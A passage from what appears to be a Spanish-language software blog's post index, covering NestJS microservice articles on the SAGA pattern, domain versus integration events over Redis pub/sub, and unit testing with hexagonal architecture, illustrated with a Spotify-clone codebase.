this.payload = payload; }}Esta clase será la base para nuestros eventos donde destacamos las siguientes propiedades: transactionID: Esta propiedad es la que relacionará todos los eventos a un proceso de compra iniciado por algún usuario. Es importante esta identificación, ya que los servicios involucrados en el 100% del diseño de estos contemplan la creación de ids internos para sus entidades. Entonces, basados en esta situación, cada operación debe estar asociada a un transactionId y debemos asociar todas las respuestas y peticiones a este identificador. pattern: Esta propiedad indicará la operación asociada. En una arquitectura basada en eventos, este representa la cola de mensajes donde enviar el evento. Payload: Nos indica el contenido de los mensajes, es la info que el servicio necesita para realizar su operación. timestamp: Nos indicará la creación del evento.Ya con nuestra evento base explicado, definimos los eventos de las operaciones:Ejemplo de create-order-saga:// libs/distributed-transactions/src/user-purchases/orchestation-saga/events/create-order-transaction.event.tstype Payload = Omit&lt;Order, 'id'&gt;;export class CreateOrderTransactionEvent extends SagaEvent&lt;Payload&gt;{ constructor(props: EventProps&lt;Payload&gt;) { super({ ...props, pattern: CreateOrderSaga.TRANSACTION }) }}// libs/distributed-transactions/src/user-purchases/orchestation-saga/events/create-order-compensation.event.tsclass Payload { @IsUUID() @IsNotEmpty() orderId: string;}export class CreateOrderCompensationEvent extends SagaEvent&lt;Payload&gt;{ constructor(props: { transactionId: string, payload: Payload }) { super({ ...props, pattern: CreateOrderSaga.COMPENSATION, }) }}// libs/distributed-transactions/src/user-purchases/orchestation-saga/events/create-order-ok.event.tsclass Payload { @ValidateNested() order: Order; }export class CreateOrderOkEvent extends SagaEvent&lt;Payload&gt;{ constructor(props: EventProps&lt;Payload&gt;) { super({ ...props, pattern: CreateOrderSaga.OK }) }}// libs/distributed-transactions/src/user-purchases/orchestation-saga/events/create-order-error.event.tsclass Payload { @IsNotEmpty() error: string; @IsNotEmpty() reason: string;}export class CreateOrderErrorEvent extends SagaEvent&lt;Payload&gt;{ constructor(props: EventProps&lt;Payload&gt;) { super({ ...props, pattern: CreateOrderSaga.ERROR }) }}Los demás eventos seguirán el mismo patrón. Dependiendo de la operación, variará el payload del evento.Envío de Eventos entre microserviciosNestJS nos permite utilizar una variedad de proveedores de microservicios, dependiendo del caso. Así que creamos un servicio llamado SagaExecutorService, el cual despachará los eventos.// libs/distributed-transactions/src/sagas/services/saga-executor.service.ts@Injectable()export class SagaExecutorService { private readonly logger = new Logger(SagaExecutorService.name) constructor(@Inject(USER_PURCHASES_CLIENT) private client: ClientProxy) { } execute&lt;T = any&gt;(event: SagaEvent&lt;T&gt;) { this.logger.debug(`Sending Event(pattern=${event.pattern}, transaction=${event.transactionId})`) this.client.emit(event.pattern, event) }}Y podemos hacer uso de este de la siguiente manera:// sending eventsthis.sagaExecutor.execute(new DeliveryTransactionEvent({ transactionId: event.transactionId, payload: { order: purchase.order }}))Independientemente de la estrategia coreográfica u orquestación, cada microservicio involucrado debe cumplir el siguiente contrato:// libs/distributed-transactions/src/sagas/ports/saga.controller.port.tsimport { RedisContext } from \"@nestjs/microservices\";export abstract class SagaControllerPort&lt;T, C&gt; { abstract onTransaction(event: T, context: RedisContext): void; abstract onCompensation(event: C, context: RedisContext): void;}Donde nuestro microservicio deberá definir la operación de transacción y la operación de compensación, donde el servicio creará el rollback del proceso.// apps/merch-products-ms/src/delivery/infrastructure/sagas/create-delivery-saga.controller.ts@Controller()export class CreateDeliverySagaController extends SagaControllerPort&lt;DeliveryTransactionEvent, DeliveryCompensationEvent&gt; { private readonly logger = new Logger(CreateDeliverySagaController.name) constructor( private readonly deliveryService: DeliveryService, private readonly sagas: SagaExecutorService ) { super(); } @EventPattern(DeliverySaga.TRANSACTION) async onTransaction(event: DeliveryTransactionEvent, context: RedisContext) { this.logger.debug(`Received Event(pattern=${event.pattern}, transactionId=${event.transactionId})`) this.logger.debug('Event-payload', event.payload) // trasaction operation } @EventPattern(DeliverySaga.COMPENSATION) onCompensation(event: DeliveryCompensationEvent, context: RedisContext) { this.logger.debug(`Received Event(pattern=${event.pattern}, transactionId=${event.transactionId})`) this.logger.debug('Event-payload', event.payload) // compensation operation }}Nuestro controlador automáticamente será asociado a nuestro servicio de mensajería definido en main.ts del microservicio. Si quieres aprender más sobre microservicios en NestJs acáDependiendo de la estrategia escogida, orquestación o coreografía, la lógica del flujo será delegada a un componente central o a los servicios involucrados. En la siguiente imagen vemos la diferencia entre coreografía y orquestación. Coreografía: Cada servicio sabe cuál es su tarea y a qué parte del flujo pertenece. Realiza las transacciones y, en caso de error, invoca las compensaciones en los servicios correspondientes, es decir, en aquellos que ya hayan tenido las operaciones correctas. Orquestación: Tendremos un componente central encargado de realizar las operaciones y coordinar las compensaciones dependiendo del paso que haya fallado. En el caso de la Coreografía, la mejor forma de comunicación será mediante eventos para poder crear un sistema distribuido escalable y desacoplado. Mientras tanto, en una Saga orquestada, podemos usar tanto la comunicación por eventos como de forma síncrona. Dependerá de la operación y su coste. Debemos considerar que este componente central deberá estar al tanto de la coherencia de las operaciones. Este enfoque tendrá la ventaja de ser más mantenible que una saga coreográfica.ConclusiónEl patrón SAGA es esencial para preservar la atomicidad de las transacciones en el entorno distribuido de los microservicios. No obstante, su implementación requiere una gestión meticulosa de fallos, durabilidad de mensajes y consistencia eventual para asegurar la integridad de los datos. Dependiendo de si utilizamos una estrategia basada en coreografía u orquestación, estas dependerán del caso. Si bien hay situaciones que no contemplamos en este artículo, las bases están declaradas y te ayudarán a entender los desafíos de los sistemas distribuidos.Github repositoryMeme de despedida" }, { "title": "Arquitecturas EDA Eventos de dominio vs eventos de integración", "url": "/posts/arquitecturas-eda-eventos-de-dominio-vs-eventos-de-integracion/", "categories": "Arquitectura, Software,DDD,Events, architecture,Backend", "tags": "arquitectura, software,ddd,events, architecture,backend", "date": "2024-02-12 02:00:00 -0300", "snippet": "La comunicación asíncrona entre microservicios nos ayuda a crear procesos complejos donde las responsabilidades del sistema están repartidas entre distintas aplicaciones. Como es la filosofía de los microservicios, separar responsabilidades para mantener ciertas características independientes entre sí nos ayuda a lograr escalabilidad, manejo de cargas y tolerancia a errores, pero esto conlleva un gran desafío de comunicación. Comunicar un servicio de forma síncrona y esperar una respuesta no siempre es viable. Hay cargas de trabajo que no requieren una respuesta inmediata, e incluso muchas veces esto puede fallar y romper todo el flujo de un proceso importante. Nadie quiere esto en una compra de considerable valor.Cuando la comunicación síncrona no es la opción, te presento las arquitecturas EDA, o arquitecturas basadas en eventos. Este enfoque nos da la posibilidad de comunicarnos con componentes tanto internos de una aplicación como con servicios o aplicaciones externas. En esta ocasión analizaremos los eventos de dominio y los eventos de integración.Comunicación basada en eventosLa integración de aplicaciones y servicios utilizando arquitecturas orientadas a eventos es esencial para crear sistemas robustos y flexibles. Dos conceptos fundamentales en este ámbito son los eventos de dominio y los eventos de integración. Ambos desempeñan roles cruciales, pero se aplican en contextos un tanto diferentes, pero a su vez son compatibles entre sí, lo que nos permite crear sistemas complejos y desacoplados.Eventos de Dominio:Los eventos de dominio son fundamentales en el diseño basado en dominio o DDD, una técnica que se centra en modelar el sistema según el dominio de negocio al que pertenece. Estos eventos representan cambios significativos en el estado del dominio y suelen estar vinculados estrechamente a los conceptos del modelo de dominio. También representan hechos pasados del dominio, por ejemplo: user-created, user-banned, stock-updated, etc. Si bien los eventos de dominio los encuentras mucho en sistemas hechos con DDD, nadie te impide usarlos en arquitecturas más simples como las de N-capas.Características Clave: Contexto de Negocio: Los eventos de dominio se originan en el núcleo del negocio y reflejan acciones o cambios relevantes para el dominio. Desacoplamiento: Permiten un desacoplamiento eficiente entre las distintas partes del sistema al enfocarse en la semántica del dominio en lugar de detalles de implementación. Modelado Preciso: Al reflejar eventos específicos del dominio, estos eventos contribuyen a un modelado más preciso y representativo del negocio.Eventos de Integración:Los eventos de integración son mensajes diseñados para coordinar la interacción entre microservicios o aplicaciones. Estos eventos abordan la necesidad de sincronización y colaboración en un entorno distribuido. Estos eventos representan mensajes que se intercambian entre componentes o servicios para mantener la coherencia y la sincronización en el ecosistema de software.Características Clave: Comunicación Inter-Servicios: Los eventos de integración facilitan la comunicación entre diferentes servicios o componentes, permitiendo la colaboración en un entorno distribuido. Desacoplamiento de Sistemas: Al utilizar eventos para la integración, se logra un desacoplamiento efectivo entre sistemas, lo que facilita la escalabilidad y la evolución independiente de cada componente. Interoperabilidad: Son esenciales para lograr interoperabilidad entre sistemas heterogéneos, ya que proporcionan un medio estandarizado de intercambio de información.Es crucial comprender que los eventos de dominio y los eventos de integración sirven propósitos diferentes, pero no son mutuamente excluyentes. De hecho, su uso combinado puede potenciar la eficacia de un sistema.Casos de Uso Eventos de dominio:En nuestra arquitectura de nuestro Spotify-clone veremos los eventos de dominio ocurridos en el microservicio music-discovery-ms. Esta aplicación contiene los siguientes módulos: user-catalog: catálogo musical del usuario con playlists personales, artistas y canciones favoritas. playlist-catalog: catálogo de playlists ofrecidas a los usuarios. shared: componentes compartidos entre los módulos.Caso de uso: El catálogo de playlists públicos debe actualizarse si el usuario actualiza sus playlists de tipo público.Cuando el usuario crea una playlist en su catálogo, si esta es de tipo público, debe agregarse automáticamente al catálogo de playlists de Spotify-clone para poder ser indexado de forma eficiente.Analizando el caso de uso, lo único que tendríamos que hacer es invocar al repositorio encargado de la playlist de Spotify-clone cuando el usuario actualice su playlist. Pero para ejemplos reales, suponiendo que la complejidad del código es alta, acoplar el módulo user-catalog con playlist-catalog en el caso de uso de actualizar catálogo de usuario no tiene nada que ver con el caso de uso de actualizar el catálogo de playlist. Esto incluso no nos permite que nuestro código sea escalable. Para solucionar esto, comunicaremos estos 2 módulos mediante eventos de dominio.Primero creamos dentro de la librería libs/utils del proyecto monorepo una librería de utilitarios de DDD llamada seedwork con clase base para los eventos de dominio. seedwork El nombre hace referencia a un tipo de mini framework de utilidades propias, pero aplicado a nivel local de tu proyecto. Puedes encontrarlo con otros nombres como shared-kernel, commons, core, etc.//libs/utils/src/seedwork/domain/events/eventbus.tsexport abstract class DomainEventBus { abstract publish&lt;T extends DomainEvent&lt;any&gt;&gt;(event: T): void}//libs/utils/src/seedwork/domain/events/domain.event.tsexport abstract class DomainEvent&lt;T = any&gt; { public readonly id: string; public readonly occurredOn: Date; constructor( public readonly name: string, public readonly payload: T ) { this.id = uuid.generate(); this.occurredOn = new Date(); }}Nos ayudamos de la librería eventemitter de NestJS para crear un eventbus en memoria para poder emitir los eventos.// libs/utils/src/seedwork/infrastructure/domain-eventbus/services/event-emitter.eventbus.ts@Injectable()export class EventEmitterEventbus implements DomainEventBus { constructor(private eventEmitter: EventEmitter2) {} async publish&lt;T extends DomainEvent&lt;any&gt;&gt;(event: T) { this.eventEmitter.emit(event.name, event); }}Generamos los eventos de dominio dentro del módulo shared de music-discovery.// apps/music-discovery-ms/src/shared/domain-events/user-music-catalog/playlist-updated.event.tsexport class PlaylistUpdatedEvent extends DomainEvent&lt;Playlist&gt; { constructor(playlist: Playlist) { super(PlaylistUpdatedEvent.NAME, playlist); } static readonly NAME = 'com.clonespotify.discovery.user-music-catalog.domain.playlist-updated'; } Utilizamos el patrón de spotifyclone.FEATURE.domain.EVENT para poder realizar patrones de filtrado sobre eventos en casos más complejos.Ahora nuestro caso de uso sería el siguiente.// apps/music-discovery-ms/src/user-catalog/application/dto/update-playlists.dto.tsexport class UpdatePlaylistsDto { @IsUUID() @IsNotEmpty() userCatalogId: string; @ValidateNested({ each: true }) playlist: Playlist; }// apps/music-discovery-ms/src/user-catalog/domain/model/playlist.model.tsexport class Playlist extends Model { @IsNotEmpty() name: string; @IsBoolean() isPublic: boolean; @IsArray() @ValidateNested({ each: true }) @Type(() =&gt; Song) songs: Song[];}// apps/music-discovery-ms/src/user-catalog/application/user-catalog.use-cases.ts@Injectable()export class UserCatalogUseCases { constructor( private readonly catalog: UserCatalogService, private readonly domainEventbus: DomainEventBus ) { } async updatePlaylists(dto: UpdatePlaylistsDto) { const playlistNotToUpdate = (playlists) =&gt; playlists.filter(p =&gt; p.id !== dto.playlist.id); return await this.catalog.findById(dto.userCatalogId) .then(catalog =&gt; { catalog.playlists = [ ...playlistNotToUpdate(catalog.playlists), dto.playlist ] return catalog }) .then(async catalog =&gt; { await this.catalog.save(catalog) return catalog }) .then(catalog =&gt; { this.domainEventbus.publish(new PlaylistUpdatedEvent(dto.playlist)); return catalog }); }}Nuestro caso de uso es simple, solo recibimos un DTO con la información de la playlist a actualizar y enviamos el evento de dominio con domainEventBus.publish().Gracias a NestJS podremos escuchar este evento mediante anotaciones en cualquier servicio @Injectable.// apps/music-discovery-ms/src/playlist-catalog/infrastructure/domain-events/domain-event.listener.ts@Injectable()export class DomainEventListener { constructor(private readonly playlist: PlaylistUseCases) {} @OnEvent('com.clonespotify.discovery.user-music-catalog.domain.playlist-updated') async onPlaylistCreated(event: PlaylistUpdatedEvent) { const playlist = event.payload if (playlist.isPublic) { await this.playlist.create(playlist) } }}Finalmente, recibimos la playlist mediante un evento y si esta es pública, se guardará en la base de datos en el módulo de playlist-catalog. De esta manera, hemos desacoplado 2 casos de uso totalmente distintos donde el modelo de playlist tiene un significado distinto dependiendo del contexto de dominio en que esté.Casos de Uso Eventos de integración:Ya tenemos claro que los eventos de integración nos ayudan a comunicar distintas aplicaciones. Para ejemplificar este concepto, tomaremos el caso de uso de creación de usuario dentro del microservicio accounts-ms, el cual es dependiente de un caso de uso más grande llamado “Bienvenida de usuario”.Caso de uso: Bienvenida de usuarioEste caso de uso involucra 3 aplicaciones: account-ms: encargado de la gestión de cuentas y usuarios. mailing-ms: encargado de enviar notificaciones de correo electrónico. music-discovery-ms: encargado de gestionar la música que le interesa o puede interesarle al usuario del clonespotify.Nuestro caso de uso es simple. Cuando se cree un usuario dentro de accounts-ms, necesitamos enviar un correo electrónico de bienvenida al usuario y a su vez necesitamos iniciar el catálogo inicial del usuario.Este simple caso de uso involucra diferentes servicios, y como vemos a simple vista, cada uno de estos tiene responsabilidades totalmente distintas entre sí, pero gracias a los eventos de integración podemos lograr un proceso distribuido entre nuestros servicios con un bajo acoplamiento.Lo primero será definir la arquitectura de eventos. Para lograrlo, nos ayudaremos del modelo pub/sub, el cual nos permitirá que múltiples clientes puedan suscribirse a algún evento y realizar sus operaciones.Creemos un servicio de Redis en nuestro docker-compose.# infrastructure/local/docker-compose.yamlversion: '3'services: # ... other services redis: container_name: redis image: redis:6.2-alpine restart: always ports: - ${REDIS_PORT}:6379 command: redis-server --save 20 1 --loglevel warning --requirepass ${REDIS_PASS} networks: - microservices-architectureInstalamos la siguiente dependencia.npm i --save ioredis NestJS nos ofrece este modelo de pub/sub basado en un servidor Redis, el cual nos ayudará a aplicar y escuchar eventos a modo de fire and forget, lo que implica la desventaja de que si nadie escucha los mensajes emitidos, estos se perderán. Pero a modo de aprendizaje, esto nos bastará.La implementación del pub/sub es simple, así que definimos la siguiente librería compartida en nuestro monorepo. integration-events├──  src│ ├──  config│ │ └──  constants.ts│ ├──  events│ │ ├──  accounts-ms│ │ │ └──  user-created.event.ts│ │ ├──  integration.event.ts│ │ ├──  integration.eventbus.ts│ │ └──  music-discovery-ms│ │ └──  user-favorites-updated.event.ts│ ├──  index.ts│ ├──  integration-events.module.ts│ ├──  services│ │ └──  redis.eventbus.ts│ └──  transporters│ ├──  get-microservice-options.ts│ └──  redis│ └──  get-redis-options.ts└──  tsconfig.lib.jsonDefinimos nuestro Eventbus.// libs/integration-events/src/events/integration.eventbus.tsexport abstract class IntegrationEventBus { abstract publish&lt;T&gt;(event: IntegrationEvent&lt;T&gt;): IntegrationEvent&lt;T&gt;;}// libs/integration-events/src/services/redis.eventbus.ts@Injectable()export class RedisEventBus extends IntegrationEventBus { constructor(@Inject(REDIS_PRODUCER_CLIENT) private client: ClientProxy) { super() } publish&lt;T&gt;(event: IntegrationEvent&lt;T&gt;): IntegrationEvent&lt;T&gt; { this.client.emit(event.name, event) return event }}// libs/integration-events/src/integration-events.module.tsconst IntegrationEventbusProvider = { provide: IntegrationEventBus, useExisting: RedisEventBus}@Module({ providers: [ RedisEventBus, IntegrationEventbusProvider ], exports: [ IntegrationEventbusProvider ], imports: [ ClientsModule.registerAsync([ { name: REDIS_PRODUCER_CLIENT, imports: [ ConfigModule.forRoot() ], useFactory: (config: ConfigService) =&gt; { const host = config.get('REDIS_HOST') const port = config.get('REDIS_PORT') const password = config.get('REDIS_PASS') return { transport: Transport.REDIS, options: { host, port, password } } }, inject: [ ConfigService ] }, ]), ]})export class IntegrationEventsModule { }Definimos los eventos.// libs/integration-events/src/events/integration.event.tsexport abstract class IntegrationEvent&lt;T&gt; { public readonly id: string; public readonly occurredOn: Date; constructor( public readonly service: string, public readonly name: string, public readonly payload: T ) { this.id = uuid.generate(); this.occurredOn = new Date(); }}// libs/integration-events/src/events/accounts-ms/user-created.event.tsexport interface Payload { id: string; username: string; email: string;}export class UserCreatedEvent extends IntegrationEvent&lt;Payload&gt; { constructor(payload: Payload) { super('accounts-ms', 'com.clonespotify.accounts.users.integration.user-updated', payload); }}Enviar eventos de integraciónAhora, dentro del módulo users de accounts-ms, importamos nuestra librería para instanciar el eventbus.// apps/accounts-ms/src/users/users.module.ts@Module({ // ...more code imports:[ IntegrationEventsModule ]})export class UsersModule {}Y hacemos uso de IntegrationEventBus dentro de nuestro servicio UserService.// apps/accounts-ms/src/users/service/user.service.ts@Injectable()export class UserService { constructor( @InjectRepository(User) private repository: Repository&lt;User&gt;, private readonly integrationEventBus: IntegrationEventBus ) {} async create(user: UserModel): Promise&lt;User&gt; { const userCreated = await this.repository.save(user); this.integrationEventBus.publish(new UserCreatedEvent({ id: userCreated.id, username: userCreated.username, email: userCreated.email })); return userCreated; }}Con esto, los eventos serán enviados al servidor Redis y quienes estén a la escucha obtendrán los mensajes.Escuchar eventos de integraciónAhora, para escuchar los eventos, instanciamos nuestro microservicio NestJS en las aplicaciones que necesiten los eventos de integración.// libs/integration-events/src/transporters/get-microservice-options.tsexport function getMicroserviceOptions() { return { transport: Transport.REDIS, options: { host: process.env.REDIS_HOST || 'localhost', port: process.env.REDIS_PORT || 6379, password: process.env.REDIS_PASS || undefined } }}Microservicio: mailing-ms// apps/mailing-ms/src/main.tsasync function bootstrap() { const app = await NestFactory.createMicroservice(MailingMsModule, getMicroserviceOptions()); await app.listen();}Microservicio: music-discovery-ms// apps/music-discovery-ms/src/main.tsasync function bootstrap() { const app = await NestFactory.create(MusicDiscoveryMsModule); app.useGlobalPipes(new ValidationPipe()) app.connectMicroservice(getMicroserviceOptions())// other features... await app.listen(port, () =&gt; { Logger.log(`Music discovery microservice listen on port: ${port}`, \"Main\") }); }Finalmente, definimos los controladores con su message pattern y ejecutar la lógica de negocio que queramos.Envío de email de bienvenida al crearse un usuario en el microservicio mailing-ms.// apps/mailing-ms/src/integration-events/controllers/integration.controller.ts@Controller()export class IntegrationController { constructor(private readonly email: EmailService) {} @MessagePattern('com.clonespotify.accounts.users.integration.user-updated') onUserCreated(@Payload() data: UserCreatedEvent, @Ctx() context: RmqContext) { Logger.log(`Event received: ${data.name} from ${data.service}`, 'QueueController') this.email.notifyUserDetails(data); }}Creación del catálogo inicial del usuario al crearse un nuevo usuario en el microservicio music-discovery-ms// apps/music-discovery-ms/src/user-catalog/infrastructure/integration-events/integration.controller.ts@Controller()export class IntegrationController { constructor(private readonly catalog: UserCatalogUseCases) {} @MessagePattern('com.clonespotify.accounts.users.integration.user-updated') onUserCreated(@Payload() event: UserCreatedEvent, @Ctx() context: RedisContext) { Logger.log(`Event received: ${event.name} from ${event.service}`, 'IntegrationController') this.catalog.createMusicCatalog({ id: Model.generateUUID(), user: { id: event.payload.id, username: event.payload.username } }) }}Finalmente, para ver el ejemplo funcionando, ejecuta lo siguiente.npm run start:infranpm run start:accountsnpm run start:mailingnpm run start:music-discoveryY envía un curl a accounts-ms.curl -X POST -H \"Content-Type: application/json\" -d '{ \"id\": \"12345678-1234-1234-1234-123456789abc\", \"username\": \"john_doe\", \"password\": \"password123\", \"email\": \"john.doe@example.com\"}' http://localhost:3013/usersFinalmente, verás los logs de la aplicación.ConclusiónExploramos los eventos de dominio y de integración con un enfoque práctico y fácil de entender. Los eventos de integración nos ayudan a crear sistemas totalmente desacoplados entre sí, y los eventos de dominio nos ayudan a modelar de mejor manera la lógica de negocio, creando un código totalmente desacoplado y con la capacidad de ser mantenible en el tiempo.Github repository" }, { "title": "Simplificando el testing unitario con arquitectura hexagonal", "url": "/posts/simplificando-el-testing-unitario-con-arquitectura-hexagonal/", "categories": "Arquitectura, Software,Testing, Unitario,Arquitectura, Hexagonal", "tags": "arquitectura, software,testing, unitario,hexagonal", "date": "2024-01-23 02:00:00 -0300", "snippet": "El testing con arquitectura hexagonal nos provee una manera limpia de crear pruebas unitarias en nuestro código sin acoplarnos a las librerías de testing o cualquier otra tecnología no relacionada a los casos de uso o reglas de negocio que queramos implementar.El testing unitario nos ayudará a evitar muchos dolores de cabeza y tiene un montón de beneficios. Al tratar de aplicarlo en códigos que no siguen buenas prácticas, se hace complejo y en muchas ocasiones duplica o triplica el tiempo de desarrollo de una funcionalidad con pruebas incluidas. En esta ocasión te voy a decir por qué las arquitecturas clean son tan valoradas por la ingeniería de software sobre proyectos complejos.Por qué hexagonal ayuda al testing unitarioLa elección de una arquitectura hexagonal para desarrollar nuestras aplicaciones no solo tiene beneficios durante la implementación, sino que también mejora significativamente el proceso de pruebas unitarias. Aquí te presento algunas razones clave: Desacoplamiento del Código de Dominio de Frameworks o Librerías: La arquitectura hexagonal nos permite mantener nuestro código de dominio completamente desacoplado de frameworks o librerías externas. Este desacoplamiento facilita la creación de pruebas unitarias, ya que podemos concentrarnos en evaluar la lógica de negocio sin preocuparnos por detalles de implementación específicos de la tecnología. Azúcar Sintáctica para las Pruebas del Código de Dominio: La estructura limpia y desacoplada de la arquitectura hexagonal proporciona un azúcar sintáctica para escribir pruebas del código de dominio. Esto se traduce en pruebas más legibles y mantenibles, ya que podemos enfocarnos en expresar directamente los casos de uso y las reglas de negocio sin distracciones innecesarias. Creación de Pruebas Acorde a Casos de Uso y Reglas de Negocio: La flexibilidad inherente de la arquitectura hexagonal nos permite crear pruebas que se alinean directamente con los casos de uso y las reglas de negocio de nuestra aplicación. Esto garantiza que nuestras pruebas sean más precisas y relevantes, abordando de manera efectiva los aspectos críticos del sistema. Creación Sencilla de Mocks: En el entorno de pruebas unitarias, la necesidad de crear mocks es común. La arquitectura hexagonal simplifica este proceso, permitiéndonos generar mocks de componentes de forma sencilla. Esto facilita la simulación de escenarios específicos para validar el comportamiento del sistema. Mocks sin Acoplamiento con Tecnologías: La creación de mocks dentro de la arquitectura hexagonal se realiza de manera que no se acoplan con tecnologías específicas. Esto significa que nuestras pruebas unitarias no dependerán de detalles de implementación tecnológica, lo que las hace más robustas y menos propensas a fallos debido a cambios en el entorno tecnológico. Ahora, para ejemplificar los beneficios de la Clean Architecture, nos ayudaremos con Spotify-clone.Ejemplo con el microservicio music-discovery-msNuestro ejemplo práctico se basa en el módulo radio de la aplicación music-discovery-ms, el microservicio encargado de descubrir nueva música para el usuario en nuestra Spotify-clone-architecture. Ahora nos centraremos en el caso de uso de updateSongs, el cual actualiza las canciones de una radio de Spotify (playlist de varios artistas con temática especial).ArquitecturaLa estructura del módulo radio de la aplicación music-discovery-ms es la siguiente: radio├──  application│ ├──  dto│ │ ├──  create-radio.dto.ts│ │ ├──  update-songs-by-radio.dto.ts│ │ └──  update-songs.dto.ts│ ├──  radio.use-cases.spec.ts│ └──  radio.use-cases.ts├──  domain│ ├──  model│ │ ├──  radio.model.ts│ │ └──  song.model.ts│ └──  repositories│ └──  radio.repository.ts├──  infrastructure│ ├──  mongo│ │ ├──  repositories│ │ │ └──  mongo-radio.repository.ts│ │ └──  schemas│ │ ├──  radio.schema.ts│ │ └──  song.schema.ts│ ├──  restful│ │ └──  radio.controller.ts│ └──  validate-model.ts└──  radio.module.ts Application: Casos de uso del módulo. También puede contener ciertas clases de tipo servicio. Domain: Modelo de entidades de dominio del módulo radio. El dominio se encarga de especificar el contrato o la especificación de las operaciones de persistencia de las entidades, mediante puertos (en este caso radio.repository.ts). Infraestructura: Todos los componentes de software que implementarán los adaptadores de las capas de dominio o aplicación. En este caso, tenemos el adaptador mongo-radio.repository.ts. Esta capa también contendrá los componentes de servicios como conexión a base de datos, servidor HTTP o cualquier otra dependencia tecnológica.Caso de uso updateSongsAquí nos enfocaremos en el caso de uso de updateSongs(), el cual recibe un DTO UpdateSongsByRadioDTO que posee la id de la radio a actualizar y las canciones que se actualizarán de la radio.// apps/music-discovery-ms/src/radio/application/radio.use-case.ts@Injectable()export class RadioUseCases { constructor(private repository: RadioRepository) {} create(dto: CreateRadioDTO) { return this.repository.save(dto) } findById(id: string) { return this.repository.findById(id) } async updateSongs(dto: UpdateSongsByRadioDTO) { return this.findRadioById(dto.radioId) .then(radio =&gt; Radio.updateSongs(radio, dto.songs)) .then(radio =&gt; this.updateRadio(radio)) } async findAll() { return this.repository.findAll() } @NotFoundExceptionIfUndefined('Radio no encontrada') private findRadioById(id: string) { return this.repository.findById(id) } @ValidateArgumentModel private async updateRadio(radio: Radio) { return this.repository.update(radio) }}DominioLas entidades del módulo son Radio y Song. Estas entidades utilizan la librería class-validator para validar el estado de sus valores. Si bien nos acoplamos a una librería de terceros, en este caso usar class-validator nos da más ventajas que desventajas, ya que las validaciones no tienen un acople fuerte gracias al patrón @Decorator, el cual agrega nuevas funcionalidades a los componentes sin tener que tocar el código principal de nuestras clases.// apps/music-discovery-ms/src/radio/domain/model/radio.model.tsexport class Radio { @IsUUID() @IsNotEmpty() @ApiProperty({ description: 'The ID of the radio' }) id: string; @IsString() @IsNotEmpty() @ApiProperty({ description: 'The name of the radio' }) name: string; @IsArray() @ValidateNested({ each: true }) @Type(() =&gt; Song) @ApiProperty({ description: 'Songs of the radio', type:[Song] }) songs: Song[] static create({ id, name, songs }: { id: string, name: string, songs: Song[]}) { const radio = new Radio() radio.id = id radio.name = name radio.songs = songs return radio } static updateSongs(radio: Radio, songs: Song[]): Radio { radio.songs = songs return radio }}// apps/music-discovery-ms/src/radio/domain/model/song.model.tsexport class Song { @IsUUID() @IsNotEmpty() @ApiProperty({ description: 'The ID of the song' }) id: string; @IsNotEmpty() @IsString() @ApiProperty({ description: 'The title of the song' }) title: string; @IsString() @ApiProperty({ description: 'The artist name of the song' }) artist: string @IsString() @ApiProperty({ description: 'The album name of the song' }) album: string @IsString() @ApiProperty({ description: 'The genre of the song' }) genre: string static create({id, title, artist, album, genre }: { id: string, title: string, artist: string, album: string, genre: string }){ const song = new Song() song.id = id song.title = title song.album = album song.artist = artist song.genre = genre return song }}Puertos del dominioSe ha definido el puerto RadioRepository, el cual describe las operaciones de persistencia.// apps/music-discovery-ms/src/radio/domain/repositories/radio.repository.tsexport abstract class RadioRepository { abstract findById(id: string): Promise&lt;Radio&gt; abstract findAll(): Promise&lt;Radio[]&gt; abstract save(radio: Radio): Promise&lt;Radio&gt; abstract update(radio: Radio): Promise&lt;Radio&gt;}Infraestructura del módulo radioLa infraestructura está dada por un módulo de persistencia basado en mongodb, donde definimos el adaptador MongoRadioRepository, el cual hereda del puerto RadioRepository e implementa la lógica de persistencia asociada a la librería mongoose.// apps/music-discovery-ms/src/radio/infrastructure/mongo/repositories/mongo-radio.repository.ts@Injectable()export class MongoRadioRepository extends RadioRepository { constructor(@InjectModel(RadioDocument.name) private model: Model&lt;RadioDocument&gt;) { super() } async save(radio: Radio): Promise&lt;Radio&gt; { const songs = radio.songs.map(s =&gt; ({ _id: s.id, title: s.title, album: s.album, artist: s.artist, genre: s.genre })) const radioCreated = new this.model({ ...radio, _id: radio.id, songs: songs }) await radioCreated.save() return radio } async findById(id: string): Promise&lt;Radio&gt; { const radioFound = await this.model.findById(id) return Radio.create({ id: radioFound.id, name: radioFound.name, songs: radioFound.songs.map(s =&gt; Song.create({ id: s.id, title: s.title, artist: s.artist, album: s.album, genre: s.genre })) }) } async findAll(): Promise&lt;Radio[]&gt; { return (await this.model.find()).map(doc =&gt; Radio.create({ id: doc.id, name: doc.name, songs: doc.songs.map(s =&gt; Song.create({ id: s._id, title: s.title, artist: s.artist, album: s.album, genre: s.genre })) })) } async update(radio: Radio): Promise&lt;Radio&gt; { const songs = radio.songs.map(s =&gt; ({ _id: s.id, title: s.title, album: s.album, artist: s.artist, genre: s.genre })) const radioUpdated = await this.model.findByIdAndUpdate(radio.id, { ...radio, songs }, { new: true }) return Radio.create({ id: radioUpdated.id, name: radioUpdated.name, songs: radioUpdated.songs.map(s =&gt; Song.create({ id: s.id, title: s.title, artist: s.artist, album: s.album, genre: s.genre })) }) }}Finalmente, tenemos un módulo restful para crear nuestro servidor HTTP que expondrá nuestros casos de uso mediante una API REST.// apps/music-discovery-ms/src/radio/infrastructure/restful/radio.controller.ts@ApiTags('Radios')@Controller('radios')export class RadioController { constructor(private radio: RadioUseCases) { } @Put(':id/songs') @ApiOperation({ summary: \"Add song to radio\" }) @ApiResponse({ status: 201, description: \"The song was added\" }) updateSongs(@Param('id', ParseUUIDPipe) id: string, @Body() updateSongs: UpdateSongsDTO) { this.radio.updateSongs({ radioId: id, ...updateSongs }) } // other methods}Definiendo las pruebas unitariasDefinimos el siguiente set de pruebas: Songs updated: Las canciones deben actualizarse. Throw NotFoundException if radio is not in database: Si tratamos de actualizar una radio que no existe, debe arrojar un NotFoundException. Archivo radio.use-case.spec.ts// apps/music-discovery-ms/src/radio/application/radio.use-cases.spec.tsimport { NotFoundException } from \"@nestjs/common\"import { RadioUseCases } from \"./radio.use-cases\"import { RadioRepository } from \"../domain/repositories/radio.repository\"describe('RadioUseCase', () =&gt; { let usecase: RadioUseCases // Prueba para verificar que se lance una NotFoundException si la radio no está en la base de datos. it('updateSongs: throw NotFoundException if radio is not in database', async () =&gt; { // Se crea un mock del repositorio con un método `findById` que devuelve undefined. const mockRepository 